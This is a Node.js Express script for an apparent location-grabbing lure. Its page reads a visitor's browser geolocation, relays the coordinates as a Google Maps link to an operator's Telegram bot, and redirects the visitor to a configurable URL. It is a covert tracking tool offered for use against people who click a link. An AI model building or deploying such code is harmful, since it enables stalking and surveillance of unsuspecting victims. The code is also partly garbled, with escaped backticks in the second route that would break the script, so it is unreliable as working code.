const express = require('express');
const fetch = require('node-fetch');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const REDIRECT_URL = process.env.REDIRECT_URL;

app.use(express.json());

app.get('/', (req, res) => {
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <title>Location Tracker</title>
    </head>
    <body>
      <h2>Tracking your location...</h2>
      <script>
        navigator.geolocation.getCurrentPosition((position) => {
          const { latitude, longitude } = position.coords;

          fetch('/send-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude })
          }).then(() => {
            window.location.href = "${REDIRECT_URL}";
          });
        });
      </script>
    </body>
    </html>
  `);
});

app.post('/send-location', async (req, res) => {
  const { latitude, longitude } = req.body;

  const message = \`Location: https://maps.google.com/?q=\${latitude},\${longitude}\`;
  const telegramURL = \`https://api.telegram.org/bot\${TELEGRAM_TOKEN}/sendMessage\`;

  await fetch(telegramURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  });

  res.sendStatus(200);
});

app.listen(PORT, () => {
  console.log(\`Server running on http://localhost:\${PORT}\`);
});￼Enter
